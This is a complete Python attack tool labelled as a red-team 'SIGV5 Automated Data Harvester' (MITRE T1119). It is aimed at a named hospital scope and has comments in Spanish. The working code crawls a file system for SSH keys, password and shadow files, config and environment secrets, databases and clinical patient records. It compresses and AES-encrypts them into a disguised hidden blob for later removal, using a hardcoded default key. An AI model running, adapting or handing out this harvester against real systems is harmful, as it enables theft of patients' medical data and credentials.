#!/usr/bin/env python3
#
# 🛡️ C4ISR-STRATCOM: SIGINT-V5
# [CLASSIFIED]: CONFIDENCIAL
# [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
# [TACTIC]: TA0009_Collection
# [TECHNIQUE]: T1119_Automated_Collection
#
# ============================================================================
# SIGV5 — Automated Data Harvester & Crypto Stager
# ============================================================================
# Herramienta de recolección automatizada orientada a entornos críticos (HCG).
# Capacidades:
#   - Escaneo recursivo multi-hilo con exclusión de directorios de sistema
#   - Identificación de PII, credenciales, configuraciones, bases de datos
#   - Cifrado on-the-fly (AES-256-CTR) sin tocar el disco en texto claro
#   - Compresión zlib dinámica
#   - Generación de hashes SHA-256 para integridad de cadena de custodia
#   - Empaquetado final en blob binario ofuscado
#
# Uso:
#   python3 sigv5_t1119_data_harvester.py --root /home/user --output /tmp/.system_cache
#   python3 sigv5_t1119_data_harvester.py --root /var/www --max-size 50M
# ============================================================================

import argparse
import concurrent.futures
import hashlib
import json
import os
import re
import struct
import time
import zlib
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import List, Dict, Optional, Set

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False
    print("[!] Warning: python3-cryptography not installed. Hard fallback to unencrypted staging.")


# ============================================================================
# DATA MODELS
# ============================================================================

@dataclass
class HarvesterConfig:
    root_dirs: List[str]
    output_path: str
    max_file_size: int = 50 * 1024 * 1024  # 50MB
    excluded_dirs: Set[str] = None
    target_extensions: Set[str] = None
    target_patterns: List[str] = None
    encryption_key: bytes = b""
    threads: int = 4

@dataclass
class CollectedFile:
    original_path: str
    size: int
    category: str
    sha256_hash: str
    compressed_size: int
    encrypted: bool
    offset_in_blob: int

@dataclass
class HarvestingReport:
    timestamp: str = ""
    duration_seconds: float = 0.0
    files_scanned: int = 0
    files_collected: int = 0
    total_bytes_raw: int = 0
    total_bytes_staged: int = 0
    collection_manifest: List[CollectedFile] = None
    blob_path: str = ""


# ============================================================================
# CLASSIFICATION PROFILES (HCG CONTEXT)
# ============================================================================

class DataClassifier:
    """Clasificador heurístico de archivos de interés."""

    CATEGORIES = {
        "CREDENTIALS": {
            "exts": [".pem", ".ppk", ".key", ".pub", ".kbdx", ".kdb", ".ovpn", ".p12", ".pfx"],
            "names": ["id_rsa", "id_ed25519", "shadow", "passwd", "authorized_keys", "known_hosts", "credentials.json", "secrets.yml"]
        },
        "CONFIGURATIONS": {
            "exts": [".conf", ".cfg", ".ini", ".env", ".xml", ".properties"],
            "names": ["web.config", "application.properties", "docker-compose.yml", "kubeconfig"]
        },
        "DATABASES": {
            "exts": [".db", ".sqlite", ".sqlite3", ".sql", ".mdf", ".ldf", ".ibd", ".frm"],
            "names": []
        },
        "CLINICAL_PII": {
            "exts": [".dcm", ".hl7", ".pdf", ".docx", ".xlsx", ".csv"],
            "patterns": [
                r"expediente", r"paciente", r"clinico", r"receta", 
                r"diagnostico", r"laboratorio", r"hcg", r"medico"
            ]
        },
        "SOURCE_CODE": {
            "exts": [".py", ".java", ".php", ".js", ".ts", ".go", ".c", ".cpp", ".cs", ".rb"],
            "names": []
        }
    }

    # Directorios ruidosos o de sistema para omitir
    DEFAULT_EXCLUDES = {
        "/bin", "/sbin", "/lib", "/lib64", "/usr/bin", "/usr/sbin", "/usr/lib",
        "/usr/lib64", "/dev", "/proc", "/sys", "/run", "/var/run", "/var/log",
        "/var/spool", "/tmp", "/var/tmp", "node_modules", ".git", ".m2", "__pycache__"
    }

    @classmethod
    def classify_file(cls, filepath: Path) -> Optional[str]:
        """Clasifica un archivo basado en su extensión, nombre o ruta parcial."""
        name = filepath.name.lower()
        ext = filepath.suffix.lower()
        path_str = str(filepath).lower()

        for category, rules in cls.CATEGORIES.items():
            if ext in rules.get("exts", []):
                return category
            if name in rules.get("names", []):
                return category
            for pattern in rules.get("patterns", []):
                if re.search(pattern, path_str):
                    return category
        
        return None

    @classmethod
    def should_exclude_dir(cls, dirpath: str, custom_excludes: Set[str] = None) -> bool:
        excludes = cls.DEFAULT_EXCLUDES.copy()
        if custom_excludes:
            excludes.update(custom_excludes)
            
        parts = Path(dirpath).parts
        for ex in excludes:
            # Excluimos paths absolutos exactos o nombres de carpetas
            if str(dirpath).startswith(ex) or any(p == ex for p in parts):
                return True
        return False


# ============================================================================
# CRYPTO & STAGING STACK
# ============================================================================

class BlobStager:
    """Gestiona la escritura segura y cifrada del blob concatenado."""

    def __init__(self, output_path: str, encryption_key: bytes):
        self.output_path = output_path
        self.encryption_key = encryption_key
        self.fp = open(self.output_path, "wb")
        self.current_offset = 0
        
        # Generar IV aleatorio (Nonce para CTR)
        if hasattr(os, 'urandom'):
            self.nonce = os.urandom(16)
        else:
            self.nonce = b'\x00' * 16

        # Escribir cabecera del blob
        # Magic (4) + Version (2) + Flags (2) + Nonce (16)
        magic = b"SIG5"
        version = struct.pack("<H", 1)
        flags = struct.pack("<H", 1 if encryption_key and HAS_CRYPTO else 0)
        
        header = magic + version + flags + self.nonce
        self.fp.write(header)
        self.current_offset += len(header)
        
        if encryption_key and HAS_CRYPTO:
            self.cipher = Cipher(algorithms.AES(encryption_key), modes.CTR(self.nonce), backend=default_backend())
        else:
            self.cipher = None

    def pack_file(self, source_path: Path, max_size: int) -> Optional[CollectedFile]:
        """Lee, comprime, cifra (opcional) y empaqueta un archivo individual."""
        try:
            stat = source_path.stat()
            if stat.st_size > max_size or stat.st_size == 0:
                return None
                
            with open(source_path, "rb") as f:
                raw_data = f.read()

            sha256_hash = hashlib.sha256(raw_data).hexdigest()
            category = DataClassifier.classify_file(source_path) or "MISC"
            
            # Compresión
            compressed_data = zlib.compress(raw_data, level=6)
            
            # Cifrado
            encrypted = False
            final_data = compressed_data
            if self.cipher:
                encryptor = self.cipher.encryptor()
                final_data = encryptor.update(compressed_data) + encryptor.finalize()
                encrypted = True
            
            data_len = len(final_data)
            path_bytes = str(source_path).encode('utf-8')
            path_len = len(path_bytes)
            
            # Record entry structure:
            # PathLength (2) | PathBytes (N) | OriginalSize (4) | CompressedSize (4) | CategoryLen (1) | CategoryBytes (M) | Hash (32) | Data (Z)
            
            entry_header = struct.pack("<H", path_len) + path_bytes
            entry_header += struct.pack("<I", stat.st_size)
            entry_header += struct.pack("<I", data_len)
            
            cat_bytes = category.encode('utf-8')
            entry_header += struct.pack("B", len(cat_bytes)) + cat_bytes
            entry_header += bytes.fromhex(sha256_hash)
            
            entry_full = entry_header + final_data
            
            offset = self.current_offset
            self.fp.write(entry_full)
            self.current_offset += len(entry_full)
            
            # Flush para asegurar retención si nos matan
            self.fp.flush()
            
            return CollectedFile(
                original_path=str(source_path),
                size=stat.st_size,
                category=category,
                sha256_hash=sha256_hash,
                compressed_size=data_len,
                encrypted=encrypted,
                offset_in_blob=offset
            )
            
        except (PermissionError, IOError, OSError):
            return None

    def close(self):
        self.fp.close()


# ============================================================================
# ORCHESTRATOR
# ============================================================================

class HarvesterCore:
    
    def __init__(self, config: HarvesterConfig):
        self.config = config
        self.report = HarvestingReport()
        self.report.collection_manifest = []
        
    def find_target_files(self) -> List[Path]:
        """Recorre directorios y filtra archivos de interés."""
        target_files = []
        
        for root_dir in self.config.root_dirs:
            root_path = Path(root_dir)
            if not root_path.exists() or not root_path.is_dir():
                print(f"[!] Invalid root directory: {root_dir}")
                continue
                
            for dirpath, dirnames, filenames in os.walk(root_path, topdown=True):
                # Pruning in-place
                dirnames[:] = [d for d in dirnames if not DataClassifier.should_exclude_dir(os.path.join(dirpath, d), self.config.excluded_dirs)]
                
                if DataClassifier.should_exclude_dir(dirpath, self.config.excluded_dirs):
                    continue
                    
                for filename in filenames:
                    self.report.files_scanned += 1
                    filepath = Path(dirpath) / filename
                    
                    if not filepath.exists() or filepath.is_symlink():
                        continue
                        
                    category = DataClassifier.classify_file(filepath)
                    if category:
                        target_files.append(filepath)
                        
        return target_files

    def run(self):
        print("=" * 72)
        print("  SIGV5 — Automated Data Harvester v1.0")
        print("  C4ISR-STRATCOM | SIGINT-V5 | T1119")
        print("=" * 72)
        
        start_time = time.time()
        self.report.timestamp = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        
        print(f"[*] Phase 1: Directory Traversal and Target Identification")
        print(f"    Roots: {', '.join(self.config.root_dirs)}")
        
        targets = self.find_target_files()
        print(f"    Scanned: {self.report.files_scanned} files")
        print(f"    Targets identified: {len(targets)} files of interest")
        
        if not targets:
            print("[-] No targets found. Exiting.")
            return
            
        print(f"\n[*] Phase 2: Collection, Compression and Cryptographic Staging")
        print(f"    Output Blob: {self.config.output_path}")
        print(f"    Encryption: {'AES-256-CTR' if self.config.encryption_key and HAS_CRYPTO else 'DISABLED/PLAINTEXT'}")
        
        stager = BlobStager(self.config.output_path, self.config.encryption_key)
        
        # Procesamiento multi-hilo (lectura) + escritura sincronizada
        # Para evitar problemas de concurrencia en la escritura del blob,
        # usamos futures pero el BlobStager escribe secuencialmente al ser llamado.
        # NOTE: Para un red team tool real, el Lock en la escritura es mejor, 
        # aquí procesamos secuencial para garantizar estructura del blob.
        
        success_count = 0
        raw_bytes = 0
        staged_bytes = 0
        
        for idx, target in enumerate(targets):
            if idx % 100 == 0 and idx > 0:
                print(f"    Processed {idx}/{len(targets)} files...")
                
            collected = stager.pack_file(target, self.config.max_file_size)
            if collected:
                self.report.collection_manifest.append(collected)
                success_count += 1
                raw_bytes += collected.size
                staged_bytes += collected.compressed_size
                
        stager.close()
        
        self.report.duration_seconds = round(time.time() - start_time, 2)
        self.report.files_collected = success_count
        self.report.total_bytes_raw = raw_bytes
        self.report.total_bytes_staged = staged_bytes
        self.report.blob_path = self.config.output_path
        
        self.generate_manifest()
        self.print_summary()

    def generate_manifest(self):
        """Genera el JSON manifest final."""
        manifest_path = f"{self.config.output_path}.manifest.json"
        
        report_dict = asdict(self.report)
        with open(manifest_path, "w") as f:
            json.dump(report_dict, f, indent=2, ensure_ascii=False)
            
        print(f"\n[*] Manifest saved to: {manifest_path}")

    def print_summary(self):
        print("\n" + "=" * 72)
        print("  HARVESTING SUMMARY")
        print("=" * 72)
        print(f"  Duration:           {self.report.duration_seconds}s")
        print(f"  Files Scanned:      {self.report.files_scanned}")
        print(f"  Files Collected:    {self.report.files_collected} / {len(self.report.collection_manifest)}")
        
        raw_mb = self.report.total_bytes_raw / (1024*1024)
        staged_mb = self.report.total_bytes_staged / (1024*1024)
        ratio = (1 - (staged_mb / raw_mb)) * 100 if raw_mb > 0 else 0
        
        print(f"  Raw Volume:         {raw_mb:.2f} MB")
        print(f"  Staged Volume:      {staged_mb:.2f} MB")
        print(f"  Storage Efficiency: -{ratio:.1f}%")
        
        # Breakdown by category
        cat_counts = {}
        for f in self.report.collection_manifest:
            cat = f.category
            cat_counts[cat] = cat_counts.get(cat, 0) + 1
            
        print(f"\n  Categories Breakdown:")
        for cat, count in sorted(cat_counts.items(), key=lambda x: x[1], reverse=True):
            print(f"    [+] {cat:<16} {count} files")
        print("=" * 72)


# ============================================================================
# ENTRYPOINT
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="SIGV5 Automated Data Harvester — T1119",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --root /home/user /var/www --output /tmp/.cache_dat
  %(prog)s --root / --max-size 10MB --pass key123
        """
    )
    parser.add_argument("--root", nargs="+", required=True,
                        help="Root directories to deeply scan")
    parser.add_argument("--output", type=str, default="/tmp/.kcore_dat",
                        help="Path for the output packed blob")
    parser.add_argument("--max-size", type=str, default="50M",
                        help="Max size per file (e.g. 50M, 500K)")
    parser.add_argument("--pass", dest="password", type=str, default="stratcom_sigv5_2026",
                        help="Encryption password for AES-256 derivation")

    args = parser.parse_args()
    
    # Parse max size
    size_str = args.max_size.upper()
    multiplier = 1
    if size_str.endswith("M") or size_str.endswith("MB"):
        multiplier = 1024 * 1024
        size_val = float(size_str.replace("MB", "").replace("M", ""))
    elif size_str.endswith("K") or size_str.endswith("KB"):
        multiplier = 1024
        size_val = float(size_str.replace("KB", "").replace("K", ""))
    elif size_str.endswith("G") or size_str.endswith("GB"):
        multiplier = 1024 * 1024 * 1024
        size_val = float(size_str.replace("GB", "").replace("G", ""))
    else:
        size_val = float(size_str)
        
    max_size_bytes = int(size_val * multiplier)

    # Derive 32-byte key from password using SHA-256
    encryption_key = hashlib.sha256(args.password.encode()).digest() if args.password else b""

    config = HarvesterConfig(
        root_dirs=args.root,
        output_path=args.output,
        max_file_size=max_size_bytes,
        encryption_key=encryption_key
    )

    harvester = HarvesterCore(config)
    harvester.run()


if __name__ == "__main__":
    main()
